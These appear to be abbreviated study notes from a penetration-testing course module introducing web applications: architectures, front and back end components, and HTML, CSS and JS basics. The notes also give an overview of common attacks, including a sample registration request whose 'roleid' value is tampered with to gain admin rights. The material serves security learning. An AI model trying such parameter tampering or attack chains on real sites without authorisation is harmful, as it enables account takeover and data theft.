# Introduction to Web Applications
## Introduction
[Web applications](https://en.wikipedia.org/wiki/Web_application) are interactive apps that run on web browsers. Web apps usually adopt a [client-server architecture](https://cio-wiki.org/wiki/Client_Server_Architecture) to run and handle interactions. They typically have front end components (i.e. the websites interface, or "what the user sees") that run on the client-side (browser) and other back end components (web app source code) that run on the server-side (back end server/db's).

This allows orgs to host powerful apps w near-complete real-time ctrl o/ their design and fc'ality while being accessible worldwide. Some examples of typical web apps include online email services like `Gmail`, online retailers like `Amazon`, and online word proc'ors like `Google Docs`.![[Pasted image 20240611120419.png]]Web apps are not exclusive to giant providers like Google or Microsoft but can be dev'd by any web dev and hosted online in any of the common hosting services, to be used by anyone on the internet. This is why today there are millions of web apps all o/ the internet, w billions of users interacting w them every day.
### Web Applications vs Websites
In the past, websites were static and could not be changed in real-time. This means that traditional websites were statically created to rep specific info, and this info would not change w interaction. To change the website's content, the corresponding pg had to be edited by the devs manually. These types of static pgs do not contain fcs and, therefore, do not produce real-time changes. That type of website is also known as [Web 1.0](https://en.wikipedia.org/wiki/Web_2.0#Web_1.0).![[Pasted image 20240611120915.png]]On the other hand, most websites run web apps, or [Web 2.0](https://en.wikipedia.org/wiki/Web_2.0), presenting dynamic content based on user interaction. Another significant diff is that web apps are fully fc'al and can perform fcs for the end-user, while web sites lack this type of fc'ality. Other key diffs b/w trad websites and web apps include:
- Being modular
- Running on any display size
- Running on any platform w/o being optimized
### Web Applications vs Native Operating System Applications
Unlike native OS apps, web apps are platform-independent and can run in a browser on any OS. These web apps do not have to be installed on a user's system b/c these web apps and their fc are exec remotely on the remote server and hence do not consume any space on the end user's hard drive.

Another adv of web apps o/ native OS apps is version unity. All users accessing a web app use the same version and the same web app, which can be continuously updated and modded w/o pushing updates to each user. Web apps can be updated in a single location (webserver) w/o dev'ing diff builds for each platform, which dramatically reduces maintenance and support costs rm'ing the need to comm changes to all users individually.

The main adv native OS apps have o/ web apps is their op speed and the ability to util native OS libs and local hardware. As native apps are built to util native OS libs, they are much faster to load and interact w. Furthermore, native apps are usually more capable than web apps, as they have a deeper integration to the OS and are not limited to the browser's capabilities.

More recently, hybrid and prog web apps are becoming more common. They util modern frameworks to run web apps using native OS capabilities and resources, making them faster than reg web apps and more capable.
### Web Application Distribution
There are many open-source web apps used by orgs worldwide that can be customized meet each orgs needs. So common open source web apps include:
- [WordPress](https://wordpress.com/)
- [OpenCart](https://www.opencart.com/)
- [Joomla](https://www.joomla.org/)
There are also proprietary 'closed source' web apps, which are usually dev'd by a certain org and then sold to another org or used by orgs through a subscription plan model. Some common closed source web apps include:
- [Wix](https://www.wix.com/)
- [Shopify](https://www.shopify.com/)
- [DotNetNuke](https://www.dnnsoftware.com/)
### Security Risks of Web Applications
Web app atks are prevalent and present a challenge for most orgs w a web presence, regardless of their size. After all, they are usually accessible from any country by everyone w an internet connection and a web browser and usually offer a vast atk surface. There are many automated tools for scanning and atking web apps that, in the wrong hands, can cause sig dmg. As web apps become more complicated and advanced, so does the possibility of critical vulns being incorporated into their design.

A successful web app atk can lead to sig losses and massive business interruptions. Since web apps are run on servers that may host other sensitive info and are often also linked to db's containing sensitive user or corporate data, all of this data could be compromised if a web site is successfully atk'd/ This is why it is crucial for any business that util's web apps to properly test these apps for vulns and patch them promptly and properly while testing that the patch fixes the flaw and does not inadvertently intro any new flaws.

Web app pentesting in an inc'ly critical skill to learn. Any org looking to sec their internet-facing (and internal) web apps should undergo freq web app tests and implement sec coding practices at ever development life cycle stage. The first step to properly pentest web apps is to understand how they work, how they are dev'd, and what kind of risk lied at each layer and component of the app depending on the techs in use.

Various web apps are designed and conf'd diff. One of the most current and widely used methods for testing web apps is the [OWASP Web Security Testing Guide.](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing).

One of the most common procedures is to start by reviewing a web app's front end components (i.e. `HTML`, `CSS`, and `JS`, aka the front end trinity), and attempt to find vulns such as [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) and [Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)). Once all front end components are thoroughly tested, the next step is typically to review the app's core fc and the interaction b/w the browser and the webserver to enum the techs the webserver uses and look for exploitable flaws. It is also typical to assess web apps from both an unauth and auth perspective (if the app has login fc) to maximize coverage and review every possible atk scenario.
### Attacking Web Applications
In this day and age, most every co., no matter the size, has one or more web apps w/i their external perimeter. These apps can be everything from simple static websites to blogs powered by Content Management Systems (CMS) such as `WordPress` to complicated apps w sign-up/login fc supporting various roles from basic users to super admins. Nowadays, it is not very common to find an externally facing host directly exploitable via a known public exploit (such as a vuln service or Windows remote code execution, RCE, vuln), though it does happen. Web apps provide a vast atk surface, and their dynamic nature means that they are constantly changing (and overlooked!). A relatively simple code change may intro catastrophic vuln or a series of vulns that can be chained together to gain access to sensitive data or RCE on the webserver or other hosts in the env, such as db servers.

It is not uncommon to find flaws that can lead directly to code exec, such as a file upload form that allows for the upload of malicious code of a file inclusion vuln that can be leveraged to obtain RCE. A well-known vuln that is still quite prevalent in various types of web apps is SQL inj. This type of vuln arises from the unsafe handling of user-supplied input. It can result in access to sensitive data, reading/writing files on the db server, and even RCE.

SQL inj vulns are often found on web apps that use AD for auth. While this can't usually be leveraged to extract passwds (since AD administers them), most or all AD user email addr's can often be pulled, which are often the same as their usernames. This data can then be used to perform a [password spraying](https://us-cert.cisa.gov/ncas/current-activity/2019/08/08/acsc-releases-advisory-password-spraying-attacks) atk against web portals that use AD for auth such as VPN or Microsoft Outlook Web Access/Microsoft O365. A successfull passwd spray can often result in access to sensitive data such as email or even a foothold directly into the corporate network env.

This example shows to dmg that can arise from a single web app vulns, esp when "chained" to extract data from one app that can be used to atk other portions of a co's external infrastructure. A well-rounded infosec professional should have a deep understanding of web apps and be as comfortable atking web apps as performing network pentesting and AD atks. A pentester w a strong foundation in web apps can often set themselves apart from their peers and find flaws that others may overlook. A few more real-world examples of web app atks and the impact are as follows:

| **Flaw**                                                                                                                                                                            | **Real-world Scenario**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [SQJ Injection](https://owasp.org/www-community/attacks/SQL_Injection)                                                                                                              | Obtaining AD usernames and performing a passwd spraying atk against a VPN or email portal                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| [File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) | Reading source code to find a hidden pg or dir which exposes additional fc that can be used to gain RCE                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)                                                                                | A web app that allows a user to upload a pfp that allows any file type to be uploaded (not just imgs). This can be leveraged to gain full ctrl of the web app server by uploading malicious code                                                                                                                                                                                                                                                                                                                                                                        |
| [Insecure Direct Object Referencing (IDOR)](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)                            | When combo'd w a flaw such as broken access ctrl, this can often be used to access another user's files or fc. An example would be editing your user profile browsing to a pg such as `/user/701/edit-profile`. The ability to change the `701` to `702` means it's possible to edit another user's profile                                                                                                                                                                                                                                                             |
| [Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)                                                                                   | Another example is an app that allows a user to register a new acct. If the acct reg fc is designed poorly, a user may perform priv-esc when reg'ing. Consider the `POST` request when reg a new user, which submits the following data:<br>`username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3`<br>It may be possible to manipulate the `roleid` param and change it to either `0` or `1`. There are real-world apps where this is the case, and it was possible to quickly reg an admin user and access many unintended feats of the web app |
Start becoming familiar w common web app atks and their implications. Don't worry if any of these terms sound foreign at this pt; they will become clearer as you progress and apply an iterative approach to learning.

It is imperative to study web apps in-depth and become familiar w how they work and many diff app stacks. Web apps will be encountered repeatedly during the HtB Academy journey, on the main HtB platform, in CTF's, and in real-life assessments. And now on to learning the structure/fc of web apps to become better-informed atkrs, set yourself apart from your peers, and find flaws that others may overlook.
## Web Application Layout
No two web apps are identical. Business create web apps for a multitude of uses and audiences. Web apps are designed and prgm'd diff, and back end infrastructure can be set up in many diff ways. It is important to understand the various ways web apps can run behind the scenes, the structure of a web app, its components, and how they can be set up w/i a co's infra.

Web app layouts consist of many diff layers that can be summarized w the following three main categories:

| **Category**                     | **Description**                                                                                                                                                                                                                |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Web Application Infrastructure` | Describes the structure of req'd components, such as the db, needed for the web app to fc as intended. Since the web app can be set up to run on a separate server, it is essential to know which db server it needs to access |
| `Web Application Components`     | The components that make up a web app rep all the components that the web app interacts w. These are divided in the following areas: `UI/UX`, `Client`, and `Server` components.                                               |
| `Web Application Architecture`   | Architecture comprises all the relationships b/w the various web app components                                                                                                                                                |
### Web Application Infrastructure
Web apps can use many diff infra setups, also called `models`. The most common models can be grouped into the following four types:
- `Client-Server`
- `One Server`
- `Many Servers - One Database`
- `Many Servers - Many Databes`
#### Client-Server
Web apps often adopt the `client-server` model. A server hosts the web app in a client-server model and distributes it to any clients trying to access it.![[Pasted image 20240612130608.png]] In this model, web apps have two types of components, those in the front end, which are usually interpreted and exec'd on the client-side (browser), and components in the back end, usually compiled, interpreted, and exec'd by the hosting server.

When a client visits the web app's URL (i.e. web addr e.g. https://www.acme.local), the server uses the main web app interface (`UI`). Once the user clicks on a button or requests a specific fc, the browser sends an HTTP web request to the server, which interprets this request and performs the necessary task(s) to complete the request (i.e. logging the user in, adding an item to the shopping cart, browsing to another pg, etc). Once the server has the req'd data, it send the result back to the client's browser, displaying the result in a human-readable way.

`The website that you are currently interacting with is also a web app, dev'd and hosted by Hack The Box (webserver), and can be accessed and interacted with using a web browser (client).`

However, even though most web apps util a client-server front-back end architecture, there are many design implementations.
#### One Server
In this arch, the entire web app or even several web apps and their components, including the db, are hosted on a single server. Though this design is straightforward and easy to implement, it is also the riskiest design.![[Pasted image 20240612131303.png]]If any web app hosted on this server is compromised in this arch, then all web apps data will be compromised. This design reps an "`all eggs in one basket`" approach.

Furthermore, if the webserver goes down for any reason, all hosted web apps become entirely inaccessible until the issue is resolved.
#### Many Servers - One Database
This model separates the db onto its own db server and allows the web apps hosting server to access the db to store and retrieve data. It can be seen as many-servers to one-db and one-server to one-db, as long as the db is separated on its own db server.![[Pasted image 20240612131612.png]]This model can allow several web apps to access a single db to have access to the same data w/o syncing the data b/w them. The web apps can be replications of one main app (e.g. primary/backup), or they can be separate web apps that share common data.

The model's main adv (`from a sec PoV`) is segmentation, where each of the main components of a web app is located and hosted separately. In case one webserver is compromised, other webservers are not directly affected. Similarly, if the db is compromised (e.g. through a SQL inj vuln), the web app itself is not directly affected. There are still access ctrl measures that need to be implemented after asset segmentation, such as limiting web app access to only data needed to fc as intended.
#### Many Servers - Many Databases
This model builds upon the `Many Servers - One Database` model. However, w/i the db server, each web app's data is hosted in a separate db. The web app can only access private data and only common data that is shared across web apps. It is also possible to host each web app's db on its separate db server.![[Pasted image 20240612132322.png]]This design is also widely used for redundancy purposes, so if any web server or db goes offline, a backup will run in its place to reduce downtime as much as possible. Although this may be more difficult to implement and may req tools like [load balancers](https://en.wikipedia.org/wiki/Load_balancing_(computing)) to fc appropriately, this archt is one of the best choices in terms of sec dur to its proper access ctrl measures and proper asset segmentation.

Aside from these models, there are other web app models avail such as [serverless](https://aws.amazon.com/lambda/serverless-architectures-learn-more) web apps or web apps that util [microservices](https://aws.amazon.com/microservices).
### Web Application Components
Each web app can have a diff num of components. Nevertheless, all of the components of the models mentioned previously can be broken down to:
1. `Client`
2. `Server`
	- Webserver
	- Web app logic
	- db
3. `Services`
	- 3rd party integrations
	- Web app integrations
4. `Functions` (Serverless)
### Web Application Architecture
The components of a web app are divided into three diff layers (aka Three Tier Architecture).

| **Layer**            | **Description**                                                                                                                                                                   |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Presentation Layer` | Consists of UI proc components that enable comms w the app and the sys. These can be accessed by the client via the web browser and are returned in the form of HTML, JS, and CSS |
| `Application Layer`  | This layer ensures that all client requests (web requests) are correctly proc'd. Various criteria are checked, such as auth, privs, and data passed on to the client.             |
| `Data Layer`         | The data layer works closely w the app layer to determine exactly where the req data is stored and can be accessed.                                                               |
An example of a web app archt could look something like this:![[Pasted image 20240613144042.png]]Furthermore, some web servers can run OS calls and prgms, like [IIS ISAPI](https://learn.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90)) or [PHP-CGI](https://www.php.net/manual/en/install.unix.commandline.php).
#### Microservices
Microservices can be thought of as independent components of the web app, which in most cases are prgm'd for one task only e.g. for an online store, the core tasks can be decomposed into the following components:
- Registration
- Search
- Payments
- Ratings
- Reviews
These components comm w the client and w each other. The comm b/w these microservices is `stateles`, which means that the request and response are independent. This is b/c the stored data is `stored separately` from the respective microservices. The use of microservices is considered [service-oriented architecture (SOA)](https://en.wikipedia.org/wiki/Service-oriented_architecture), build as a collection of diff auto fc focused on a single business goal. Nevertheless, these microservices depend on each other.

Another essential and efficient microservice component is that they can be written in diff prog-langs and still interact. Microservices benefit from easier scaling and faster dev of apps, which encourages innovation and speeds up markey delivery of new features. Some benefits of microservices include:
- Agility
- Flexible scaling
- Easy deployment
- Reusable code
- Resilience
The AWS [whitepaper](https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf) provides an excellent overview of microservice implementation.
#### Serverless
Cloud providers such as AWS, GCP, and Azure, among others, offer servless archt. These platforms provide app frameworks to build such web apps w/o having to worry about the servers themselves. These web apps then run in stateless computing containers (e.g. Docker). This type of archt gives a co the flexibility to build and deploy apps and service w/o having to mng infra; all server mngment is done by the cloud provider, which gets rid of the need to provision, scale, and maintain servers needed to run apps and db's.

More info about servless computing and its various use cases can be found [here](https://aws.amazon.com/serverless).
### Architecture Security
Understanding the general archt of web apps and each web app's specific design is important when performing a pentest on any web app. In many cases, an individual web app's vuln may not necessarily be caused by a prgming error but by a design error in its archt.

For example, an individual web app may have all of its core fc securely implemented. However, due to a lack of proper access ctrl measures in its design, e.g. [Role-Based Access Control (RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), users may be able to access some admin feats that are not intended to be directly accessible to them or even access other user's private info w/o having the privs to do so. To fix this type of issue, a sig design change would need to be implemented, which would likely be both costly and time-consuming.

Another example would be if a db cannot be found after exploiting a vuln and gaining ctrl over the back-end server, which may mean that the db is hosted on a separate server. Only part of the db data may be found, which may mean there are several db's in use. This is why sec must be considered at each phase of web app dev, and pentests must be carried throughout the web app dev lifecycle.
## Font-end vs Back-end
The [terms](https://en.wikipedia.org/wiki/Front_end_and_back_end) `front end` and `back end` in web dev are very common, as is the term [Full Stack](https://www.w3schools.com/whatis/whatis_fullstack.asp) web dev, which refers to both `front end` and `back end` web dev. These terms are becoming synonymous w web app dev, as they comprise the majority of the web dev cycle. However, these terms are v diff from each other, as each refers to one side of the web app, and each fn and comm in diff areas.
### Front End
The front end of a web app contains the user's components directly through their web browser (client-side). These components make up the source code of the web pg that are viewed when visiting a web app and usually include `HTML`, `CSS`, and `JS`, which is then interpreted in real-time by our browsers.![[Pasted image 20240614122620.png]]This includes everything that the user sees and interacts w, like the pg's main elements such as the title and text [HTML](https://www.w3schools.com/html/html_intro.asp), the design and animation of all elements [CSS](https://www.w3schools.com/css/css_intro.asp), and what fn each part of a pg performs [JavaScripts](https://www.w3schools.com/js/js_intro.asp).

In modern web apps, front end components should adapt to any screen size and work w/i any browser on any device. This contrasts w back end components, which are usually written for a specific platform or OS. If the front end of a web app is not well optimized, it may make the entire web app slow and unresponsive. In this case, some users may think that the hosting server, or their internet, is slow, while the issue lies entirely on the client-side at the user's browser. This is why the front end of a web app must be optimized for most platforms, devices (including mobile!), and screen sizes.

Aside from front end code dev, the following are some of the other tasks related to front end web app dev:
- Visual Concept Web Design
- User Interface (UI) design
- User Experience (UX) design
There are many sites avail to practice front end coding. One example is [this one](https://html-css-js.com/). Practice with the [editor](https://htmlg.com/html-editor/), type and format text and see the resulting `HTML`, `CSS`, and `JS` being gen'd. The following simple example can be copy/pasted into the right hand side of the editor.
```html
<p><strong>Welcome to Hack The Box Academy</strong><strong></strong></p>
<p></p>
<p><em>This is some italic text.</em></p>
<p></p>
<p><span style="color: #0000ff;">This is some blue text.</span></p>
<p></p>
<p></p>
```
Watch the simple HTML code render on the left. Play around w the formatting, headers, colors, etc, and watch how the code changes.
### Back End
The back end of a web application drives all of the core web app fn, all of which is exec'd at the back end server, which proc's everything req'd for the web app to run correctly. It is the part that isn't usually seen or directly interacted w, but a website is just a collection of static web pg's w/o a back end.

There are four main back end components for web apps:

| **Component**            | **Description**                                                                                                                                                                                             |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Back end Servers`       | The hardware and OS that hosts all other components and are usually run on OS's like `Linux`, `Windows`, or using `Containers`.                                                                             |
| `Web Servers`            | Web servers handle HTTP requests and connections. Some examples are `Apache`, `NGINX`, and `IIS`.                                                                                                           |
| `Databases`              | Databases (`DBs`) store and retrieve the web app data. Some examples of relational db's are `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, while examples of non-relational db's include `NoSQL`, and `MongoDB`. |
| `Development Frameworks` | Dev Frameworks are used to dev the core web app. Some well-known frameworks include `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS JavaScript`)        |
![[Pasted image 20240614130104.png]]It is also possible to host each component of the back end on its own isolated server, or in isolated containers, by util'ing services such as [Docker](https://www.docker.com/).
To maintain logical separation and mitigate the impact of vulns, diff components of the web app, such as the db, can be installed in one Docker container, while the main web app is installed in another, thereby isolating each part from potential vulns that may affect the other container(s). It is also possible to separate each into its dedicated server, which can be more resource-intensive and time-consuming to maintain. Still, it depends on the biz case and design/fn of the web app in question.

Some of the main jobs performed by back end components include:
- Dev the main logic and services of the back end of the web app
- Dev the main code and fn of the web app
- Dev and maintain the back end db
- Dev and implement libs to be used by the web app
- Implement technical/biz needs for the web app
- Implement the main [APIs](https://en.wikipedia.org/wiki/API) for front end component comms
- Integrate remote servers and cloud services into the web app
### Securing Front/Back End
Even though in most cases, pentesters will not have access to the back end code to analyze the individual fn's and the structure of the code, it does not make the app invuln. It could still be exploited by various inj atks, for example.

Suppose there is a search fn in a web app that mistakenly does not proc search queries correctly. In that cs, specific manipulation techniques could be used to manipulate the queries in such a way that unauth access can be gained to specific db data [SQL inj's](https://www.w3schools.com/sql/sql_injection.asp) or even exec OS cmds via the web app, also known as [Command Injections](https://owasp.org/www-community/attacks/Command_Injection).

Later sections of this module will discuss how to sec each component used on the front and back ends. When full access to the source code of front end components is gained, code review can be performed to find vulns, which is part of what is referred to as [Whitebox Pentesting](https://en.wikipedia.org/wiki/White-box_testing).

On the other hand, back end components' source code is stored on the back end server, so access to it is not the default. This will force performing what is known as [Blackbox Pentesting](https://en.wikipedia.org/wiki/Black-box_testing). However, as will be seen, some web apps are open source, meaning access to the source code is common. Furthermore, some vulns, such as [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), could allow the source code from the back end server can be obtained. W this source code in hand, code review can then be performed on back end components to further understand how the app works, potentially find sensitive data in the source code, and even find vulns that would be diff or impossible to find w/o access to the source code

The `top 20` most common mistakes web devs make that are essential for pentesters are as follows:
1. Permitting invalid data to enter the db
2. Focusing on the sys as a whole
3. Est'ing personally dev'd sec methods
4. Treating sec to be the last step
5. Dev paintext passwd storage
6. Creating weak passwds
7. Storing unenc data in the db
8. Depending excessively on the client side
9. Being too optimistic
10. Permitting vars via the URL path name
11. Trusting third-party code
12. Hard-coding backdoor accts
13. Unverified SQL inj
14. Remote file inclusions
15. Insec data handling
16. Failing to enc data properly
17. Not using a sec cryptographic sys
18. Ignoring layer 8
19. Review user actions
20. Web app fw misconfs
These mistakes lead to the [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulns for web apps, which will be discussed in other modules:
1. Broken access ctrl
2. Cryptographic failures
3. Injection
4. Insecure design
5. Sec misconf
6. Vuln and Outdated Components
7. ID and auth failures
8. Software and data integrity failures
9. Sec logging and monitoring failures
10. Server-side request forgery (SSRF)
It is important to begin to become familiar w these flaws and vulns as they form the basis for many of the issues covered in future web and even non-web related modules. Pentesters must have the ability to competently ID, exploit, and explain these vulns to clients.
# Front-end Components
## HTML
The first and most dominant component of the front-end of web apps in [HyperText Markup Language (HTML)](https://en.wikipedia.org/wiki/HTML). HTML is at the very core of any web pg seen on the internet. It contains each pg's basic elements, including titles, forms, imgs, and many other elements. The web browser, in turn, interprets these elements and displays them to the end-user.

The following is a very basic example of an HTML pg:
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```
This would display the following:![[Pasted image 20240615133125.png]]Notice that HTML elements are displayed in a tree form, similar to `XML` and other langs:
```shell
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```
Each element can contain other HTML elements, while the main `HTML` tag should contain all other elements w/i the pg, which falls under `document`, distinguishing b/w `HTML` and docs written for other langs, such as `XML` docs.

The HTML elements of the above code can be viewed as follows: (click to see the code)
<html>
    <head>
<title>Page Title</title>
    </head>
    <body>
<h1>A Heading</h1>
<p>A Paragraph</p>
    </body>
</html>
Each HTML element is opened and closed w a tag that specifies the element's type (e.g. `<p>` for paragraphs), where the content would be placed b/w these tags. Tags may also hold the element's ID or class (e.g. `<p id='para1'>` or `<p id='red-paragraphs>`), which is needed for CSS to properly format the element. Both tags and the content comprise the entire element.
### URL Encoding
An important concept to learn in HTML is [URL Encoding](https://en.wikipedia.org/wiki/Percent-encoding), or percent-encoding. For a browser to properly display a pg's contents, it has to know the charset in use. In URLs, for example, browser can only use [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding, which only allows alphanumerical chars and certain special chars. Therefore, all other chars outside of the ASCII charset have to be encoded w/i a URL. URL encoding replaces unsafe ASCII chars w a `%` symbol followed by two hexadecimal digits.

For example, the single-quote char `'` is encoded to `%27`, which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space w either a `+` (plus sign) or `%20`. Some common char encodings are:

| **Character** | **Encoding** |
| ------------- | ------------ |
| space         | %20          |
| !             | %21          |
| "             | %22          |
| #             | %23          |
| $             | %24          |
| %             | %25          |
| &             | %26          |
| '             | %27          |
| (             | %28          |
| )             | %29          |
A full char encoding tbl can be seen [here](https://www.w3schools.com/tags/ref_urlencode.ASP).

Many online tools can be used to perform URL encoding/decoding. Furthermore, the popular web proxy [Burp Suite](https://portswigger.net/burp) has a encoder/decoder which can be used to convert b/w various types of encodings. [This online tool](https://www.url-encode-decode.com/) can be used to practice encoding/decoding chars and str's.
#### Usage
The `<head>` element usually contains elements that are not directly printed on the pg, like the pg title, while all main pg elements are located under `<body>`. Other important elements include the `<style>`, which holds the pg's `CSS` code, and the `<script>`, which holds the `JS` code of the pg, as will be seen in the next section.

Each of these elements is called a [Document Object Model (DOM)](https://en.wikipedia.org/wiki/Document_Object_Model). The [World Wide Web Consortium (W3C)](https://www.w3.org/) defines `DOM` as:

`"The W3C Doc Obj Model (DOM) is a platform and lang-neutral interface that allows progs and scripts to dynamically access and update the content, structure, and style of a doc."`

The DOM std is separated into 3 parts:
- `Core DOM` - the std model for all doc types
- `XML DOM` - the std model for XML docs
- `HTML DOM` - the std model for HTML docs
For example, from the above tree view, we can refer to DOMs as `document.head` or `document.h1`, and so on.

Understanding the HTML DOM can help to understand where each element can be viewed on the pg is located, which enables viewing the source code of a specific element on the pg and look for potential issues. HTML elements can be located by their ID, their tag name, or by their class name.

This is also useful while utilizing front-end vulns (like `XSS`) to manipulate existing elements or create new elements to serve your needs.
## Cascading Style Sheets (CSS)
[Cascading Style Sheets (CSS)](https://www.w3.org/Style/CSS/Overview.en.html) is the stylesheet lang used alongside HTML to format and set the style of HTML elements. Like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. Browsers are updated alongside it to support these new features.
#### Example
At a fundamental level, CSS is used to def the style of each class or type of HTML elements (i.e. `body` or `h1`), such that any element w/i that pg would be rep'd as def'd in the CSS file. This could include the font family, font size, background color, txt color and alignment, and more.
```css
body {
  background-color: black;
}

h1 {
  color: white;
  text-align: center;
}

p {
  font-family: helvetica;
  font-size: 10px;
}
```
As previously mentioned, this is why unique IDs and class names for certain HTML elements may be set so that they can be referred to later w/i CSS or JS when needed.
### Syntax
CSS def's the style of each HTML element or class b/w curly brackets `{}`, w/i which the properties are def'd w their vals (i.e. `element { property : value; }`).

Each HTML element has many properties that can be set through CSS, such as `height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size`, and hundreds of other properties. All of these can be combined and used to design visually appealing web pgs.

CSS can be used for advanced animations for a wide variety of uses, from moving items all the way to advanced 3D animations. Many CSS properties are avail for animations, like `@keyframes`, `animation`, `animation-duration`, `animation-direction`, and many others. Other animation properties can be read about and practiced [here](https://www.w3schools.com/css/css3_animations.asp).
#### Usage
CSS is often used alongside JS to make quick calcs, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystokes or the mouse cursor location.

The following example beautifully illustrates such capabilities of CSS when used w HTML and JS "[Parallax Depth Cards - by Andy Merskin](https://codepen.io/andymerskin/pen/XNMWvQ) on [CodePen](https://codepen.io/)"

This shows that even though HTML and CSS are among the most basic cornerstones of web dev when used properly, they can be used to build visually stunning web pgs, which can make interacting w web apps much easier and more user-friendly experience.

Furthermore, CSS can be used alongside other langs to implement their styles, like `XML` or w/i `SVG` items, and can also be used in modern mobile dev platforms to design entire mobile app UIs.
### Frameworks
Many may consider CSS to be diff to dev. In contrast, others may argue that it is inefficient to manually set the style and design of all HTML elements on each web pg. This is why many CSS frameworks have been introduced, which contain a collection of CSS style-sheets and designs, to make it must faster and easier to create beautiful HTML elements.

Furthermore, these frameworks are optimized for web app usage. They are designed to be used w JS and for wide use w/i a web app and contain elements usually req'd w/i modern web apps. Some of the most common CSS frameworks are:
- [Bootstrap](https://www.w3schools.com/bootstrap4/)
- [SASS](https://sass-lang.com/)
- [Foundation](https://en.wikipedia.org/wiki/Foundation_(framework))
- [Bulma](https://bulma.io/)
- [Pure](https://purecss.io/)
## JavaScript
[JavaScript (JS)](https://en.wikipedia.org/wiki/JavaScript) is one of the most used langs in the world. It is mostly used for web dev and mobile dev. `JavaScript` is usually used on the front end of an app to be exec'd w/i a browser. Still, there are implementations of back end JS used to dev entire web apps, like [NodeJS](https://nodejs.org/en/about/).

While `HTML` and `CSS` are mainly in charge of how a web pg looks, `JS` is usually used to ctrl any fn that the front end web pg req's. W/o `JS`, a web pg would be mostly static and would not have much fn or interactive elements.
#### Example
W/i the pg source code, `JS` code is loaded w the `<script>` tag, as follows:
```html
<script type="text/javascript">
..JavaScript code..
</script>
```
A web pg can also load remote `JS` code w `src` and the script's link, as follows:
```html
<script src="./script.js"></script>
```
An example of basic use of `JS` w/i a web pg is the following:
```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```
The above example changes the content of the `button1` HTML element. From here on, there are many more advanced uses of `JS` on a web pg. The following shows an example of what the above `JS` code would do when linked to a button click:
Changes: <button onclick="document.getElementById('button1').innerHTML = 'Changed Text!';" id="button1">Original Text</button> to <button onclick="document.getElementById('button1').innerHTML = 'Changed Text!';" id="button1">Changed Text!</button>

As w HTML, there are many sites avail online to experiment w `JS`, such as [JSFiddle](https://jsfiddle.net/) which can be used to test `JS`, `CSS`, and `HTML` and save code snippets. `JS` is an advanced lang, and its syntax is not as simple as `HTML` or `CSS`.
### Usage
Most common web apps heavily rely on `JS` to drive all needed fn on the web pg, like updating the web pg view in real-time, dynamically updating content in real-time, accepting and proc'ing user input, and many other potential fn's.

`JS` is also used to automate complex proc's and perform HTTP requests to interact w the back end components and send and retrieve data, through techs like [Ajax](https://en.wikipedia.org/wiki/Ajax_(programming)).

In addition to automation, `JS` is also often used alongside `CSS`, as previously mentioned, to drive advanced animations that would not be possible w `CSS` alone. Whenever an interactive and dynamic web pg is visited that uses many advanced and visually appealing animations, this is the result of active `JS` code running on the browser.

All modern web browsers are equipped w `JS` engines that can exec `JS` code on the client-side w/o relying on the back end webserver to update the pg. This makes using `JS` a very fast way to achieve a large num of proc's quickly.
### Frameworks
As web apps become more advanced, it may be inefficient to use pure `JS` to dev an entire web app from scratch. This is why a host of `JS` frameworks have been introduced to improve the exp of web app dev

These platforms intro libs that make it v simple to recreate advanced fn's, like user login and user reg, and the intro new techs based on existing ones, like the use of dynamically changing `HTML` code, intead of using static `HTML` code.

These platforms either use `JS` as their prog lang or use an implementation of `JS` that compiles its code into `JS` code.

Some of the most common front end `JS` frameworks are:
- [Angular](https://www.w3schools.com/angular/angular_intro.asp)
- [React](https://www.w3schools.com/react/react_intro.asp)
- [Vue](https://www.w3schools.com/whatis/whatis_vue.asp)
- [jQuery](https://www.w3schools.com/jquery/)

A listing and comparison of common JavaScript frameworks can be found [here](https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks).
# Front End Vulnerabilities
## Sensitive Data Exposure
